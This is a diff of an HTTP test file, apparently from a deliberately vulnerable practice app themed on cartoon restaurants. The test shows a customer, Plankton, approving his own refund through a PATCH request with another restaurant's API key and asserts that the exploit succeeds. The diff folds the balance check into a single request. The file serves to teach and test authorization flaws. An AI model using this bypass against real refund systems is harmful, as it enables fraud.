@@ -31,23 +31,6 @@
 # =============================================================================
 
 # =============================================================================
-# SETUP: Plankton has a pending refund at Krusty Krab
-# =============================================================================
-
-### Verify balance before exploit (uses shared large_refund_pending fixture)
-# @name refund_request
-# @forceRef large_refund_pending
-{{
-  exports.planktonCookie = await auth.login("plankton");
-}}
-# @tag orders, r03, v301, vulnerable
-GET /account/credits
-Cookie: {{planktonCookie}}
-
-@balance_before = {{$(response).balance()}}
-?? js $(response).balance() == {{200 - order_total}}
-
-# =============================================================================
 # EXPLOIT: Customer approves own refund with unrelated restaurant API key
 # =============================================================================
 
@@ -55,7 +38,13 @@ Cookie: {{planktonCookie}}
 # The authorization check passes because his cookie owns the order,
 # even though Chum Bucket has no authority over Krusty Krab orders.
 # @name approve_refund
-# @forceRef refund_request
+# @forceRef large_refund_pending
+{{
+  const cookie = await auth.login("plankton");
+  exports.planktonCookie = cookie;
+  // Capture balance before exploit (assertions run AFTER request!)
+  exports.balanceBefore = await user("plankton").balance();
+}}
 # @tag orders, r03, v301, vulnerable
 PATCH /orders/{{order_id}}/refund/status
 Cookie: {{planktonCookie}}
@@ -67,15 +56,5 @@ status=approved
 # VULNERABLE: Exploit succeeds - refund approved by wrong restaurant
 ?? js $(response).isOk() == true
 ?? js $(response).field("status") == approved
-
-# =============================================================================
-# IMPACT: Verify refund was paid out
-# =============================================================================
-
-### Plankton received full refund (balance restored to 200)
-# @forceRef approve_refund
-# @tag orders, r03, v301, vulnerable
-GET /account/credits
-Cookie: {{planktonCookie}}
-
-?? js $(response).balance() == 200.00
+# IMPACT: Plankton received full refund (balance increased by order_total)
+?? js await user("plankton").balance() == {{balanceBefore + order_total}}
